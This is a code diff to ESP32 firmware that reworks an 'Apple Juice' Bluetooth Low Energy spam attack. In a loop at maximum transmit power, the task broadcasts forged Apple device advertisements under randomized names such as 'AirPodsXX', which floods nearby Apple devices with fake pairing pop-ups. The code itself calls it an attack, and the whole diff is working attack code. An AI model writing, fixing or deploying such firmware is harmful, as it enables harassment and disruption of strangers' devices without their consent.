@@ -1215,9 +1215,6 @@ void stopAppleJuice() {
   if (ajAdv) {
     ajAdv->stop();
   }
-  if (applejuiceTaskHandle) {
-    // task will exit and clear handle
-  }
   if (xSemaphoreTake(attackMutex, SEM_TIMEOUT) == pdTRUE) {
     attackRunning = false; stopRequested = false;
     applejuiceTaskHandle = NULL;
@@ -1231,57 +1228,65 @@ void applejuice_task(void* param) {
   logEvent("Apple Juice BLE spam started");
   setLedState(LS_PURPLE);
 
-  BLEDevice::init("AirPods");
-  esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, ESP_PWR_LVL_P21);
-  BLEServer* pServer = BLEDevice::createServer();
-  ajAdv = pServer->getAdvertising();
-  esp_bd_addr_t null_addr = {0xFE, 0xED, 0xC0, 0xFF, 0xEE, 0x69};
-  ajAdv->setDeviceAddress(null_addr, BLE_ADDR_TYPE_RANDOM);
+  // ESP-IDF BLE gap advertising (works on Arduino-ESP32 3.3.x)
+  // Init controller + bluedroid if not already
+  static bool bleInited = false;
+  if (!bleInited) {
+    BLEDevice::init("AJ");
+    esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, ESP_PWR_LVL_P21);
+    bleInited = true;
+  }
 
+  BLEAdvertising* pAdv = BLEDevice::getAdvertising();
+  if (!pAdv) {
+    logEvent("AJ: getAdvertising failed");
+    if (xSemaphoreTake(attackMutex, SEM_TIMEOUT) == pdTRUE) {
+      attackRunning = false; stopRequested = false;
+      applejuiceTaskHandle = NULL;
+      xSemaphoreGive(attackMutex);
+    }
+    setLedState(LS_GREEN);
+    vTaskDelete(NULL);
+    return;
+  }
+  ajAdv = pAdv;
   ajRunning = true;
-  int idx = 0;
 
   while (attackRunning && !stopRequested && ajRunning) {
-    BLEAdvertisementData oAdvertisementData;
-    oAdvertisementData.setFlags(0x06);
-
-    esp_bd_addr_t dummy;
-    dummy[0] = 0xF0 | (esp_random() & 0x0F);
-    for (int j = 1; j < 6; j++) dummy[j] = esp_random() & 0xFF;
+    BLEAdvertisementData advData;
+    advData.setFlags(0x06);
 
     int choice = esp_random() % 2;
     if (choice == 0) {
-      int di = esp_random() % (sizeof(AJ_DEVICES)/sizeof(AJ_DEVICES[0]));
+      int di = esp_random() % (int)(sizeof(AJ_DEVICES)/sizeof(AJ_DEVICES[0]));
       #if ESP_ARDUINO_VERSION >= ESP_ARDUINO_VERSION_VAL(3, 0, 0)
-        oAdvertisementData.addData(String((char*)AJ_DEVICES[di], 31));
+        advData.addData(String((char*)AJ_DEVICES[di], 31));
       #else
-        oAdvertisementData.addData(std::string((char*)AJ_DEVICES[di], 31));
+        advData.addData(std::string((char*)AJ_DEVICES[di], 31));
       #endif
     } else {
-      int di = esp_random() % (sizeof(AJ_SHORT)/sizeof(AJ_SHORT[0]));
+      int di = esp_random() % (int)(sizeof(AJ_SHORT)/sizeof(AJ_SHORT[0]));
       #if ESP_ARDUINO_VERSION >= ESP_ARDUINO_VERSION_VAL(3, 0, 0)
-        oAdvertisementData.addData(String((char*)AJ_SHORT[di], 23));
+        advData.addData(String((char*)AJ_SHORT[di], 23));
       #else
-        oAdvertisementData.addData(std::string((char*)AJ_SHORT[di], 23));
+        advData.addData(std::string((char*)AJ_SHORT[di], 23));
       #endif
     }
 
-    int at = esp_random() % 3;
-    if (at == 0) ajAdv->setAdvertisementType(ADV_TYPE_IND);
-    else if (at == 1) ajAdv->setAdvertisementType(ADV_TYPE_SCAN_IND);
-    else ajAdv->setAdvertisementType(ADV_TYPE_NONCONN_IND);
+    pAdv->setAdvertisementData(advData);
+    // Randomize local name lightly
+    char name[12];
+    snprintf(name, sizeof(name), "AirPods%02X", (unsigned)(esp_random() & 0xFF));
+    pAdv->setName(name);
 
-    ajAdv->setDeviceAddress(dummy, BLE_ADDR_TYPE_RANDOM);
-    ajAdv->setAdvertisementData(oAdvertisementData);
-    ajAdv->start();
+    pAdv->start();
     incrementPackets(1);
-    vTaskDelay(pdMS_TO_TICKS(700 + (esp_random() % 300)));
-    ajAdv->stop();
-    vTaskDelay(pdMS_TO_TICKS(50));
+    vTaskDelay(pdMS_TO_TICKS(600 + (esp_random() % 400)));
+    pAdv->stop();
+    vTaskDelay(pdMS_TO_TICKS(40));
   }
 
-  if (ajAdv) ajAdv->stop();
-  BLEDevice::deinit(false);
+  if (pAdv) pAdv->stop();
   ajAdv = nullptr;
   ajRunning = false;
 
